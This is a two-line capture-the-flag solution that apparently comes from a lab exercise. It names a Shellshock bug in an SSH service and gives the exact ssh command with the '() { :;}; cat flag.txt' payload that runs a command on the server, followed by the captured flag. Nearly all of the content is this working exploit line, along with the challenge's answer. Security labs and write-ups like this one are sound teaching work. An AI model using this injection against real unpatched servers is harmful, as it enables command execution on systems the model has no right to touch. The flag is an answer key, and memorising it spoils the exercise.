The ssh server is vulnerable to shellshock. To get it to print the flag, simply run `ssh -l ctf localhost -p 2022 '() { :;}; cat flag.txt'`
flag: `shocking_the_shellz_is_fun`
